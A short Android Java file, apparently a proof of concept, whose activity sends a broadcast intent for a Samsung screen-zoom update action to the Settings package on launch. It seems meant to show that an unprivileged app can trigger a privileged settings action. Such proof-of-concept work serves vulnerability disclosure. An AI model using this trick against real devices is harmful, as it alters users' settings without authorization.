package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.samsung.intent.action.UPDATE_SCREEN_ZOOM");
        i.setPackage("com.android.settings");
        sendBroadcast(i);
    }
}